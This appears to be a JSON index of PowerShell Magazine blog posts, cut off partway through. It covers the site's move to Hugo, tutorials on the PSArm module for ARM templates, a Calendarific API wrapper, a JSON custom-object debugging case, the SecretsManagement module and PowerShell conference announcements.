

















































































































































































































































































































































































































































































































































































































































































































































































































































































[{"categories":["News"],"contents":"This one took a while but we finally moved to a new home! No more painful management of plugins and updates to PHP.\nWhen we launched in 2011, there was not much choice but use WordPress as the platform for content management. It worked well. We brought up a site in no time and started authoring and inviting new authors. In no time, we grew from 6 editors writing everything to 85+ contributing authors. We published the largest collection of PowerShell Tips and Tricks, ran in-depth series of articles on InfoSec and PowerShell DSC, conducted many author contests, and published a ton of other interesting content. More than 70% of the content on this site was published between 2014 and 2018. We built a community. The most powerful community. We had over 1 million views per year.\nWe slowed down since 2018 and did not really invest much time on reviving this. Also, the overhead of content management meant someone had to continuously look into issues that were popping up because of a failed plugin to making sure that the content is secure. We had instances of content hijacking because of vulnerabilities in WordPress. To be honest, with full time jobs, none of the editors had that time. Early 2020, I started looking for options to move my personal blog to a static site for more or less similar reasons and finally moved it to use Hugo platform for static page generation. With Hugo, I can write all my content in markdown and it gets compiled to HTML. With simple automation and a GitHub repository, I could automate the overall publishing process.\nLooking at the simplicity in authoring and publishing workflow for my own blog, I made a decision that PowerShell Magazine should go the same way. There are tools to export WordPress content to markdown. It, of course, comes with its own issues. We had 833 articles to move and each article gets exported to a markdown file. However, this markdown may not be compatible with the theme that we choose to implement. This meant, I had to go through each and every article, convert code snippets to match the theme style, convert absolute URLs to relative URLs, download images to a new folder structure, and make sure each article loaded as expected. Not much of this could be automated. This was a painfully long process. I am glad I finally finished. You see the result here.\nThe content for this site is hosted in a GitHub repository. Every time we commit a new article or change to an existing one, a GitHub Action gets triggered that builds the static site and pushes it to the public facing repository which then hosts it using GitHub pages. This process is very simple. And, if you are familiar with how GitHub workflows can be automated, we have endless possibilities. We are yet to complete building a fully-automated publishing workflow but once we complete that you \u0026ndash; as an author \u0026ndash; can simply submit an article and the rest will happen automatically.\nWhether you are an existing author or a new author who wants to contribute to PowerShell Magazine, do read our updated contribution guidelines. If you are a featured author on PowerShell magazine, check out your author page to see if there is anything that you want to update. We will publish a toolkit to generate article drafts and author pages very soon. This will help you create a good and clean starting point to write your content as markdown.\nWe are working on generating some exciting content for you and cannot wait to start sharing it with you. While we are busy bringing in more content, feel free to share any feedback and/or questions with us.\nMahalo!\n","image":"https://powershellmagazine.com/images/welcomehome.png","permalink":"https://powershellmagazine.com/2021/05/03/the-all-new-powershell-magazine-is-here-and-more-to-come/","tags":["News"],"title":"The all new PowerShell Magazine is here and more to come!"},{"categories":["Azure Resource Manager","PSArm","Azure","Module Spotlight"],"contents":"In the first part of this series, you learned about PSArm \u0026ndash; a PowerShell embedded DSL \u0026ndash; that you can use to declaratively define your Azure infrastructure and generate an ARM template. PSArm, being a PowerShell DSL, supports PowerShell language constructs and builds the object model for ARM templates on top of PowerShell. So, if you are already familiar with PowerShell, writing ARM templates now will be as simple as writing another PowerShell script. So, how do you get started?\nInstalling PSArm You can get PSArm module from the PowerShell gallery.\nInstall-Module -Name PSArm -AllowPrerelease You can also build module from the source code available on GitHub.\nThis module, when loaded, exports a bunch of functions and cmdlets.\nPS C:\\sandbox\\psarm\u0026gt; Get-Command -Module PSArm CommandType Name Version Source ----------- ---- ------- ------ Function add 0.1.0 PSArm Function and 0.1.0 PSArm Function array 0.1.0 PSArm Function base64 0.1.0 PSArm Function base64ToJson 0.1.0 PSArm Function base64ToString 0.1.0 PSArm Function bool 0.1.0 PSArm Function coalesce 0.1.0 PSArm Function concat 0.1.0 PSArm Function contains 0.1.0 PSArm Function copyIndex 0.1.0 PSArm Function createArray 0.1.0 PSArm Function createObject 0.1.0 PSArm Function dataUri 0.1.0 PSArm Function dataUriToString 0.1.0 PSArm Function dateTimeAdd 0.1.0 PSArm Function deployment 0.1.0 PSArm Function div 0.1.0 PSArm Function empty 0.1.0 PSArm Function endsWith 0.1.0 PSArm Function environment 0.1.0 PSArm Function equals 0.1.0 PSArm Function extensionResourceId 0.1.0 PSArm Function false 0.1.0 PSArm Function first 0.1.0 PSArm Function float 0.1.0 PSArm Function format 0.1.0 PSArm Function greater 0.1.0 PSArm Function greaterOrEquals 0.1.0 PSArm Function guid 0.1.0 PSArm Function if 0.1.0 PSArm Function indexOf 0.1.0 PSArm Function int 0.1.0 PSArm Function intersection 0.1.0 PSArm Function json 0.1.0 PSArm Function last 0.1.0 PSArm Function lastIndexOf 0.1.0 PSArm Function length 0.1.0 PSArm Function less 0.1.0 PSArm Function lessOrEquals 0.1.0 PSArm Function list 0.1.0 PSArm Function listAccountSas 0.1.0 PSArm Function listAdminKeys 0.1.0 PSArm Function listAuthKeys 0.1.0 PSArm Function listChannelWithKeys 0.1.0 PSArm Function listClusterAdminCredential 0.1.0 PSArm Function listConnectionStrings 0.1.0 PSArm Function listCredential 0.1.0 PSArm Function listCredentials 0.1.0 PSArm Function listKeys 0.1.0 PSArm Function listKeyValue 0.1.0 PSArm Function listPackage 0.1.0 PSArm Function listQueryKeys 0.1.0 PSArm Function listRawCallbackUrl 0.1.0 PSArm Function listSecrets 0.1.0 PSArm Function listServiceSas 0.1.0 PSArm Function listSyncFunctionTriggerStatus 0.1.0 PSArm Function max 0.1.0 PSArm Function min 0.1.0 PSArm Function mod 0.1.0 PSArm Function mul 0.1.0 PSArm Function newGuid 0.1.0 PSArm Function not 0.1.0 PSArm Function null 0.1.0 PSArm Function or 0.1.0 PSArm Function padLeft 0.1.0 PSArm Function parameters 0.1.0 PSArm Function providers 0.1.0 PSArm Function range 0.1.0 PSArm Function reference 0.1.0 PSArm Function replace 0.1.0 PSArm Function resourceGroup 0.1.0 PSArm Function resourceId 0.1.0 PSArm Function skip 0.1.0 PSArm Function split 0.1.0 PSArm Function startsWith 0.1.0 PSArm Function string 0.1.0 PSArm Function sub 0.1.0 PSArm Function subscription 0.1.0 PSArm Function subscriptionResourceId 0.1.0 PSArm Function substring 0.1.0 PSArm Function take 0.1.0 PSArm Function tenantResourceId 0.1.0 PSArm Function toLower 0.1.0 PSArm Function toUpper 0.1.0 PSArm Function trim 0.1.0 PSArm Function true 0.1.0 PSArm Function union 0.1.0 PSArm Function uniqueString 0.1.0 PSArm Function uri 0.1.0 PSArm Function uriComponent 0.1.0 PSArm Function uriComponentToString 0.1.0 PSArm Function utcNow 0.1.0 PSArm Function variables 0.1.0 PSArm Cmdlet ConvertFrom-ArmTemplate 0.1.0 PSArm Cmdlet ConvertTo-PSArm 0.1.0 PSArm Cmdlet New-PSArmDependsOn 0.1.0 PSArm Cmdlet New-PSArmEntry 0.1.0 PSArm Cmdlet New-PSArmFunctionCall 0.1.0 PSArm Cmdlet New-PSArmOutput 0.1.0 PSArm Cmdlet New-PSArmResource 0.1.0 PSArm Cmdlet New-PSArmSku 0.1.0 PSArm Cmdlet New-PSArmTemplate 0.1.0 PSArm Cmdlet Publish-PSArmTemplate 0.1.0 PSArm You can see that the exported functions are similar to what ARM template language offers.\nPSArm Syntax Basics A typical PSArm script for ARM template starts with the Arm keyword. Within the Arm body, you define each Azure resource using the Resource keyword.\nArm { Resource \u0026#34;identifier\u0026#34; -Namespace \u0026#34;Microsoft.resource\u0026#34; -ApiVersion \u0026#34;resourceApiVersion\u0026#34; -Type \u0026#34;resourceType\u0026#34; { properties { \u0026#34;propertyName\u0026#34; \u0026#34;value\u0026#34; } } output \u0026#34;Output from deployment\u0026#34; } The Arm, Resource, and output keywords are aliases defined in the module.\nPS C:\\sandbox\\psarm\u0026gt; (Get-Alias).Where({$_.Source -eq \u0026#39;PSArm\u0026#39;}) CommandType Name Version Source ----------- ---- ------- ------ Alias Arm -\u0026gt; New-PSArmTemplate 0.1.0 PSArm Alias ArmArray -\u0026gt; New-PSArmArray 0.1.0 PSArm Alias ArmElement -\u0026gt; New-PSArmElement 0.1.0 PSArm Alias ArmSku -\u0026gt; New-PSArmSku 0.1.0 PSArm Alias DependsOn -\u0026gt; New-PSArmDependsOn 0.1.0 PSArm Alias Output -\u0026gt; New-PSArmOutput 0.1.0 PSArm Alias RawCall -\u0026gt; New-PSArmFunctionCall 0.1.0 PSArm Alias RawEntry -\u0026gt; New-PSArmEntry 0.1.0 PSArm Alias Resource -\u0026gt; New-PSArmResource 0.1.0 PSArm With Arm keyword, you can specify an optional Name parameter which will be used as a name of the deployment within the template. For the resource definition, you use the Resource keyword. You must specify a Name to be used for the resource you want to provision, Namespace of the resource, ApiVersion, and Type. As you enter arguments for these four parameters, you will see that PowerShell dynamically adds some more parameters based on the type of resource you intend to provision.\nFor example, as you see in the above screenshot, as soon as I added the Type parameter and its argument, I get Kind and Tags as the dynamic parameters. You can, then, use the ArmSku keyword to specify the SKU of the resource that you intend to provision. In case of a storage account, this can be set to Standard_LRS or any other supported value. Each Azure resource may need some more additional properties for resource provisioning and configuration. You can use the properties keyword for this purpose. PSArm gives you the auto-completion of property names within the properties block.\nFinally, the output keyword can be used to retrieve properties required from the deployed resource objects. This keyword takes Name, Type, and Value as parameters.\nFirst PSArm Script Here is a complete PSArm script for provisioning a simple storage account.\nArm -Name myFirstTemplate -Body { Resource \u0026#39;mypsarmsaccount\u0026#39; ` -Namespace \u0026#39;Microsoft.Storage\u0026#39; ` -Type \u0026#39;storageAccounts\u0026#39; ` -apiVersion \u0026#39;2019-06-01\u0026#39; ` -Kind \u0026#39;StorageV2\u0026#39; ` -Location \u0026#39;WestUS\u0026#39; { ArmSku \u0026#39;Standard_LRS\u0026#39; Properties { accessTier \u0026#39;Hot\u0026#39; } } Output \u0026#39;storageResourceId\u0026#39; -Type \u0026#39;string\u0026#39; -Value (ResourceId \u0026#39;Microsoft.Storage/storageAccounts\u0026#39; (Concat \u0026#39;myPsArmSaccount\u0026#39;)) } Make a note of the ResourceId and Concat functions used along with the output keyword. PSArm has public function parity with what is offered in ARM template language. You can save this script with a .psarm.ps1 extension and generate the ARM template JSON using the Publish-PSArmTemplate cmdlet that PSArm module provides.\nPublish-PSArmTemplate -Path .\\firstTemplate.psarm.ps1 ` -OutFile .\\firstTemplate.json -Force Here is the generated ARM template JSON for the PSArm script that you just built.\n{ \u0026#34;$schema\u0026#34;: \u0026#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0.0.0\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;_generator\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;psarm\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.1.0.0\u0026#34;, \u0026#34;psarm-psversion\u0026#34;: \u0026#34;5.1.19041.610\u0026#34;, \u0026#34;templateHash\u0026#34;: \u0026#34;5716551932369025750\u0026#34; } }, \u0026#34;resources\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;myFirstTemplate\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Resources/deployments\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2019-10-01\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;Incremental\u0026#34;, \u0026#34;expressionEvaluationOptions\u0026#34;: { \u0026#34;scope\u0026#34;: \u0026#34;inner\u0026#34; }, \u0026#34;template\u0026#34;: { \u0026#34;$schema\u0026#34;: \u0026#34;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0.0.0\u0026#34;, \u0026#34;resources\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;mypsarmsaccount\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;2019-06-01\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Storage/storageAccounts\u0026#34;, \u0026#34;kind\u0026#34;: \u0026#34;StorageV2\u0026#34;, \u0026#34;location\u0026#34;: \u0026#34;WestUS\u0026#34;, \u0026#34;sku\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Standard_LRS\u0026#34; }, \u0026#34;properties\u0026#34;: { \u0026#34;accessTier\u0026#34;: \u0026#34;Hot\u0026#34; } } ], \u0026#34;outputs\u0026#34;: { \u0026#34;storageResourceId\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;[resourceId(\u0026#39;Microsoft.Storage/storageAccounts\u0026#39;, concat(\u0026#39;myPsArmSaccount\u0026#39;))]\u0026#34; } } } } } ] } This ARM template can be deployed using your favorite command line tool or using template deployment in Azure Portal.\nWhen using Azure CLI,\naz deployment group create --resource-group psarm --template-file .\\firstTemplate.json When using Azure PowerShell,\nNew-AzResourceGroupDeployment -ResourceGroupName psarm -TemplateFile .\\firstTemplate.json This is it. Congratulations. You just used PowerShell based DSL to generate and deploy an ARM template. In the next part of this series, you will learn more parameterizing PSArm scripts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2021/04/05/getting-started-with-arm/","tags":["Modules","PSArm","Azure Resource Manager","Azure"],"title":"Getting Started with PSArm"},{"categories":["Azure Resource Manager","PSArm","Azure","Module Spotlight"],"contents":"Those who worked on Azure Resource Manager (ARM) templates understand that complexity of writing and making sure the template works as expected becomes very complicated as the complexity of a deployment grows. ARM template language uses JSON data representation format and it is not a language to be honest. It is fragments of functions and other programming constructs embedded into JSON which only the Azure Resource Manager understands. There are tools such as the Visual Studio Code extension that attempt to simplify the ARM template authoring experience. But, end of the day, when you have to debug an issue within the ARM template, it won\u0026rsquo;t be easy based on the complexity of the template. There are other tools that intend to simplify provisioning Azure resources.\nHashiCorp Terraform is one of the most popular provisioning tools that can provision Azure resources. Pulumi provides the necessary support to define your Azure infrastructure in a supported programming language like write Go, Python, C#, F#, and so on. Both Terraform and Pulumi support multiple cloud providers. You may have recently seen or read about Project Bicep as well. Bicep is domain-specific language meant for generating ARM templates. The most recent entrant in this race is what the PowerShell product team announced \u0026ndash; PSArm module (preview) which provides a PowerShell-embedded domain-specific language (DSL) for Azure Resource Manager (ARM) templates. This is an experimental module and certainly not meant for production use yet. This module enables users to leverage the existing PowerShell scripting knowledge to author ARM templates using PowerShell. Once you write ARM template as a PowerShell DSC using PSArm which can be used to generate the ARM template JSON. This, at the moment, is just an experimental project and more like a proof-of-concept for creating a DSL within PowerShell.\nComparison between Project Bicep and PSArm naturally arises as both these projects are from Microsoft.\nProject Bicep Bicep is a domain-specific language (DSL) that is specifically designed for transpiling Bicep code into ARM templates. Generating ARM templates is the only purpose here. Bicep is not a general-purpose programming language. At the time of this writing, Bicep is in the very early stages of development but it is supported by Microsoft for production use. Think of Bicep as a transparent abstraction on Azure Resource Manager. For someone who is getting started with Azure Resource Manager and Azure deployments, Bicep will be a great start. It is simple and easy to learn. No doubt. Bicep can even decompile (on a best effort basis) your existing ARM templates to Bicep. Bicep seems to have taken some inspiration from how Terraform use HashiCorp Configuration Language (HCL). Bicep already has an excellent VS Code extension that makes your life easy when authoring Bicep files.\nHere is a Bicep file looks like. This is a simple storage account creation.\nparam storageAccountName string @allowed([ 'Hot', 'Cool', 'Archive' ]) @ param accessTier string = 'Hot' @allowed([ 'WestUS2', 'CentralUS' ]) param location string = 'WestUS2' resource sa 'Microsoft.Storage/storageAccounts@2019-06-01' = { name: storageAccountName location: location sku: { name: 'Standard_LRS' } kind: 'StorageV2' properties: { accessTier: 'Hot' } } You can build an ARM template from this Bicep file using the bicep command line.\nbicep build main.bicep But since Bicep is a language meant only for ARM template generation, there may not be a way to interact with other parts of the system. For example, what if you had certain configuration artifacts stored in a CMDB and you want to pull that data and use in a Bicep program. This won\u0026rsquo;t be possible. At least for now. You will be restricted to what language constructs are available within Bicep.\nPSArm PSArm on the other hand is an embedded DSL module. If you are already familiar with PowerShell language, it will be quite natural to choose a DSL that works in PowerShell. There is no need to learn another language. With PowerShell, you get access to a wide-range of APIs other than what PSArm may provide. This helps in creating complex and dynamic ARM templates with just what PowerShell can do. You get use all aspects of PowerShell language and the underlying infrastructure.\nHere is how a PSArm script looks like. Again, this is for simple storage account creation.\nparam( [Parameter(Mandatory)] [string] $StorageAccountName, [Parameter()] [ValidateSet(\u0026#39;WestUS2\u0026#39;, \u0026#39;CentralUS\u0026#39;)] [string] $Location = \u0026#39;WestUS2\u0026#39;, [Parameter()] [ValidateSet(\u0026#39;Hot\u0026#39;, \u0026#39;Cool\u0026#39;, \u0026#39;Archive\u0026#39;)] [string] $AccessTier = \u0026#39;Hot\u0026#39; ) Arm { Resource $StorageAccountName -Namespace \u0026#39;Microsoft.Storage\u0026#39; -Type \u0026#39;storageAccounts\u0026#39; -apiVersion \u0026#39;2019-06-01\u0026#39; -Location $Location { ArmSku \u0026#39;Standard_LRS\u0026#39; Properties { accessTier $AccessTier } } } Here is how you can compile the above PSArm file into an ARM template.\nPublish-PSArmTemplate -Path .\\newStorageAccount.psarm.ps1 -Parameters @{ storageAccountName = \u0026#39;storageName\u0026#39; location = \u0026#39;location\u0026#39; } You can see that both Bicep and PSArm files more or less have the same number of lines. PowerShell is a little more verbose given the nature of how PowerShell commands are built.\nAt this point in time, I don\u0026rsquo;t see this as a Bicep vs PSArm. It is about whether you want to learn a new language or use your existing skills. This is just a quick introduction to PSArm. Next in this series of articles on PSArm, you will learn more about using PSArm.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2021/04/01/psarm-powershell-dsl-for-azure-resource-manager-introduction/","tags":["Modules","PSArm","Azure Resource Manager","Azure"],"title":"PSArm - PowerShell DSL For Azure Resource Manager - Introduction"},{"categories":["Module Spotlight"],"contents":"Calendarific offers a webservice for listing holidays from different countries. They also have an API that can be used by developers to implement this holiday queries in the their own applications.\nAccessing this API requires an API key which can be registered for free at https://calendarific.com/signup.\nThis module is a wrapper around the Calendarific API. You can install the module from the PowerShell Gallery.\nInstall-Module -Name PSCalendarific -Force The following commands are available in this module.\nGet-Command -Module PSCalendarific CommandType Name Version Source ----------- ---- ------- ------ Function Get-PSCalendarificCountry 1.0.0.0 PSCalendarific Function Get-PSCalendarificDefaultConfiguration 1.0.0.0 PSCalendarific Function Get-PSCalendarificHoliday 1.0.0.0 PSCalendarific Function Register-PSCalendarificDefaultConfiguration 1.0.0.0 PSCalendarific Function Unregister-PSCalendarificDefaultConfiguration 1.0.0.0 PSCalendarific Register-PSCalendarificDefaultConfiguration This command helps set the parameter defaults for accessing the API. At present, this command supports only storing APIKey and Country values as default configuration. API key must always be provided and the Get-PSCalendarificHoliday requires Country name as well for listing the holidays. Therefore, these configuration settings can be stored locally so that other commands in the module can be used without explicitly providing any of these parameters.\n Note: Storing API key on local filesystem is not a good practice.\n Register-PSCalendarificDefaultConfiguration -APIKey \u0026#39;1562567d51443af046079a9bca8a84a358e2c393\u0026#39; -Country IN -Verbose WARNING: This command stores specified parameters in a local file. API Key is sensitive information. If you do not prefer this, use Unregister-PSCalendarificDefaultConfiguration -APIKey to remove the API key from the store This command has no mandatory parameters. You can specify either APIKey or Country or both. When you need to update either configuration parameters, just specify the parameter you want to update.\nUnregister-PSCalendarificDefaultConfiguration This command helps you remove the stored API key or just delete the configuration store itself.\nUnregister-PSCalendarificDefaultConfiguration -APIKey -Verbose If you do not specify any parameters, the configuration store gets deleted.\nGet-PSCalendarificDefaultConfiguration This command gets the stored defaults from the configuration store.\nGet-PSCalendarificDefaultConfiguration -Verbose APIKey Country ------ ------- 1562567d51443af046079a9bca8a84a358e2c393 IN Get-PSCalendarificHoliday This command lists all holidays for a given country based on the parameters supplied. If you do not provide any parameters, this commands tries to find and use the default parameter values from the configuration store.\nGet-PSCalendarificHoliday The following are different parameters supported with this command.\n   Parameter Name Description Default Value     APIKey Key to access the API No default Value. When not specified, the command will try to use the default parameter from configuration store.   Country Country No default Value. When not specified, the command will try to use the default parameter from configuration store.   Year Year for which the holidays need to be listed The command internally defaults to the current year.   Month Month for which the holidays need to be listed. No default value but the valid values are 1 .. 12   Day Day for which the holidays need to be listed. No default value but the valid values are 1 .. 31.   Type Type of holidays No default value but the valid values are national, local, religious, and observance.    This module is available on GitHub as well in case you want to contribute or create issues.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/03/23/powershell-wrapper-around-the-calendarific-api/","tags":["Modules"],"title":"PowerShell wrapper around the Calendarific API"},{"categories":["PSConf","PSConfAsia"],"contents":"PowerShell Conference Asia 2019 was held in Bangalore (India). It was such a great event and fun hosting it here. For the first time in the history of PowerShell Conference Asia we had 220+ PowerShell lovers at the conference. The pre-conference workshops were very well received and the rest two days of conference was equally fun. With over 15+ international speakers, the attendees had great time learning about their favorite features and getting their doubts cleared.\nWe have understood that the PowerShell community in India is really looking forward to the year 2020 event and there is already enough buzz about it in the local communities. We are looking forward to host more PowerShell lovers than the previous year and I am sure we are heading in that direction.\nToday, we are delighted to announce PowerShell and DevOps Conference Asia 2020. We will be hosting it from November 5th to 7th in Bangalore again.\nWe are still working out the details about the venue and will announce it as soon as we finalize on that. We will ensure that this year conference will be much more bigger and better than the previous year.\nIf you are interested in submitting sessions, please wait for call for paper announcement next week.\nStay tuned for more information!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/03/12/powershell-and-devops-conference-asia-2020/","tags":["Conferences"],"title":"PowerShell and DevOps Conference Asia 2020"},{"categories":["Debugging"],"contents":"In the last two or three months, I have been busy working on a complete end to end deployment automation solution and been writing lot of PowerShell code. Literally, lot of code. A simple to use deployment automation solution always has complex implementation beneath. I was dealing with several configuration files, dynamically deciding what configuration to fetch and update, and dealing with hundreds of lines of dynamically generated JSON for progress tracking and so on.\nWhile working with one such JSON (shown below), I was seeing a strange error when trying to update a specific property within the JSON.\n{ \u0026#34;id\u0026#34; : \u0026#34;6894cb4e-907c-43d0-b79d-c4fb8ef422eb\u0026#34;, \u0026#34;description\u0026#34; : \u0026#34;Just another manifest for deployment\u0026#34;, \u0026#34;version\u0026#34; : \u0026#34;1.0.0.0\u0026#34;, \u0026#34;systems\u0026#34; : [ { \u0026#34;serialNumber\u0026#34; : \u0026#34;123abc\u0026#34;, \u0026#34;ipAddress\u0026#34; : \u0026#34;8.9.10.11\u0026#34;, \u0026#34;status\u0026#34; : \u0026#34;pending\u0026#34; }, { \u0026#34;serialNumber\u0026#34; : \u0026#34;456def\u0026#34;, \u0026#34;ipAddress\u0026#34; : \u0026#34;8.9.10.12\u0026#34;, \u0026#34;status\u0026#34; : \u0026#34;pending\u0026#34; }, { \u0026#34;serialNumber\u0026#34; : \u0026#34;789ghi\u0026#34;, \u0026#34;ipAddress\u0026#34; : \u0026#34;8.9.10.13\u0026#34;, \u0026#34;status\u0026#34; : \u0026#34;pending\u0026#34; } ] } This is a very minimal and simplified version of JSON that I have in the automation framework. In this JSON, based on the status of deployment, I need to update the status property of each system in the manifest.\nHere is what I tried.\nNow, that error is pretty strange. To investigate this, I looked at the type of object that was getting returned from the Where() method.\nUpdate (2/11): Prasoon commented on this post and mentioned that the Item() method on this collection to update the status property. Here is how we do it based on his suggestion\n$manifest.systems.Where({$_.serialNumber -eq \u0026#39;123abc\u0026#39;}).item(0).Status = \u0026#39;Complete\u0026#39; What you see below is my investigation before Prasoon commented on this post!\nIt should ideally be a PS custom object. The where() method is therefore doing something to the custom object. I tried, then, using the index of an object within the systems collection.\nc\nThis is good. So, I can work around the issue with Where() method by using the index but the only catch here is that I need to dynamically determine the index of a specific object instance during the orchestration. I tried a couple of methods.\nI was skeptical about the above method of using where() again. And, it does fail. The index of the object instance returned using this method is always -1.\nIn the second method, I resorted to using a simple for loop to gather the index of the node.\n$serialNumber = \u0026#39;456def\u0026#39; for ($currentIndex = 0; $currentIndex -lt $manifest.systems.Count; $currentIndex++) { if ($manifest.systems[$currentIndex].serialNumber -eq $serialNumber) { break } else { continue } } $manifest.systems[$currentIndex].status = \u0026#39;complete\u0026#39; The above snippet does not look super optimal to me but works as expected.\nI have not figured out any other optimal way of handling this but have you come across something like this? Do you see a better way to handle this?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/02/10/the-case-of-unknown-custom-object-property/","tags":["Debugging"],"title":"The Case of Unknown Custom Object Property"},{"categories":["Module Spotlight","SecretManagement"],"contents":"In any method of automation secrets management is a very critical part. You wouldn\u0026rsquo;t want to store the plain-text credentials needed for your automation to carry on the orchestration tasks. Similarly, other secrets such as certificate thumbprints and account keys must be stored in a secure location that the orchestration can access and consume.\nWithin PowerShell, we have always used the built-in credential manager to store such secrets. There are a bunch of modules out there on VPNbug Gallery that you can readily use.\nFind-Module -Name \u0026#34;*Credential*\u0026#34;, \u0026#34;*Secret*\u0026#34; There are also modules that are wrappers around 3rd party vaults such as Hashicorp Vault or SecureStore. However, there was nothing that was officially supported by Microsoft (Azure Vault doesn\u0026rsquo;t count for secrets management in PowerShell) or PowerShell team until now.\nAt Ignite 2019, PowerShell team introduced secrets management in PowerShell. Today, PowerShell team announced a development release version of a module for PowerShell secrets management.\nInstall-Module -Name Microsoft.PowerShell.SecretsManagement -AllowPrerelease This module uses the built-in credential manager for secrets management and provides the above commands for that purpose. The current design of this module allows extensibility as per the PowerShell team blog post. Therefore, you must be able to add support for another vault by registering the PowerShell module (provided it adheres to the format required by the SecretsManagement module) written for the 3rd party vault.\nI have been using some existing modules for secret management in my build and deployment automation. I mostly use the built-in Credential Manager for this purpose. In fact, I demonstrated how I use this in Garuda framework. With the development release of this new module from PowerShell team, I will start looking at moving my existing automation to use this module. The one advantage I see here is the extensibility nature of the module. This provides enough flexibility when moving from one type of vault to another or introduce a new one when necessary. Looking forward to see what the community comes up here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2020/02/07/secrets-management-in-powershell/","tags":["Modules"],"title":"Secrets Management in PowerShell"},{"categories":["PSConfEU","PSConf"],"contents":"June 2, 2020, PowerShell Conference Europe opens for the 5th time in Hannover, Germany. Here is a quick walkthrough for this year’s event.\nLearning New Things As an experienced PowerShell professional, you know its awesome automation capabilities.\nAt the same time, you probably spent numerous hours googling for tricky answers, came across unexpected astonishing tricks and capabilities that you didn\u0026rsquo;t know exist, and may still have questions that none of your colleagues could fully answer. There is just so much you can do with PowerShell, and almost every month something new is added somewhere in the ecosystem.\nYou may have the best colleagues or the most experienced trainers, yet there is no one in the world who knows it all, let alone knows it best.\nJust take a look at the tip of the knowledge iceberg, and check out these three lines:\nInstall-Module -Name ImportExcel -Scope CurrentUser -Force $Path = \u0026#34;$env:temp\\report.xlsx\u0026#34; Get-Service | Export-Excel -Path $Path -Now In virtually no time, it turns any PowerShell data into a beautiful Excel report. You don’t even need Microsoft Office to be installed. Maybe you knew this, maybe you use it all the time.\nBut what if you didn\u0026rsquo;t? If you did not know about the ImportExcel module before, how much extra work would that have cost you?\nIf you never used Install-Module before, and the things in its background, know about PowerShellGet, release pipelines, private repositories, and how to combine Git with the PowerShell Gallery, psconf.eu could be worth a rewarding visit. Any of these items are covered one way or another.\nThis example is just the tiny tip of the iceberg. Sometimes it’s just a matter of hinting a powerful module that can make your day. Often, though, it’s a bit more complex to bring you to the next level, and add new skills. Check the agenda below, the speakers, and their sessions. Chances are there are tons of topics just waiting for you to improve your skill set and tickle your intellect.\nMelting Pot of Creativity There is not the one almighty super trainer that can teach everything in one class, and the more you know the harder it gets to learn new things in standard classes anyway. But there is one place where you can meet them all: psconf.eu!\nThat’s why five years ago, we decided to create the PowerShell Conference Europe: to bring together bright heads and experienced folks and set the stage to have a great time together.\nEach year we invite 40 renown top experts to deliver expert talks from various areas. Top people. Like James O’Neill who coincidentally co-created the wonderful ** ImportExcel** module (together with _Doug Finke_) that I used in the sample above. A conference and place to learn about super useful work done by others. To meet the people behind them and say “thank you”. To ask (any) question, even if it is super hard and tricky, and still get the best answers.\nHere is a list of our PowerShell Gladiators for this year (preliminary with a few more to be added):\n Even these 40 people don’t know everything. This conference is not about these 40 invited speakers delivering their talks unidirectional to you. There talks act as a starting point, to get the thinking started, to get discussions going.\nWe\u0026rsquo;ll again have a lot of valuable content taking place and being generated in coffee breaks, in lunch break sessions or by asking questions. This conference is a 4-day learning experience for advanced PowerShell professionals. Help steer PowerShell into the right direction and be a part of it. You can make a difference!\nPlus, in some sense an opportunity for companies to reward hard working individuals. If you are the boss and thinking how could I say “Thank you”, sending your automation crew or successful consultant or script guru to psconf.eu could be an idea.\nHere’s a video from last year so you get a better impression:\n  To sign up and reserve your seat, or to get a proposal for your boss, please visit the registration page (https://psconf.eu/register.html).\nThis year, we are working on a delegate jacket. It would help us a lot if you decided to sign up before March 15 for a number of reasons, including not to have to guess jacket sizes. Anyone signing up by March 15 gets a guaranteed jacket size and make sure you get one of the limited seats. Anyone else gets a best-effort jacket size, and we are doing our best at extrapolating jacket sizes.\nThe Specs: Conference \u0026amp; Training Hybrid psconf.eu is a lot of things:\n– Classic Conference: We experimented over the years with the number of sessions and parallel tracks. We wanted to make sure you can always pick a session that matters to you and build a dense agenda while at the same time not missing too much.\n Four days turned out the best trade-off between getting out of work and consuming adequate content and justifying the travel.\n Three tracks turned out to be the best trade-off between having rich choices and not missing too many other sessions, so psconf.eu runs 4 days, on each day you have a choice of three parallel sessions.\n– Focused Sessions: We tinkered with session lengths and found that 45 minutes of session time plus 15 minutes of Q\u0026amp;A is the perfect way for speakers to focus on the beef yet dig deep enough, and delegates to stay focused.\n– Coffee Break Talks: We started with just a few traditional coffee breaks only to find that Coffee Break Talks are the perfect ending for every session; personal talks with the speakers, professional discussions among delegates provide extra value. A quick walk, a smoke, or checking emails may be your way to guarantee that you are ready for action once the next session starts.\n At psconf.eu, there is now a coffee break after every session.\n– Great Environment: Don’t be mistaken: listening to dense sessions for a whole day is hard work. It is fun but it still exhausting. That’s why we make sure attendees get recharged whenever possible: no typical “conference sandwich” but instead a variety of healthy and 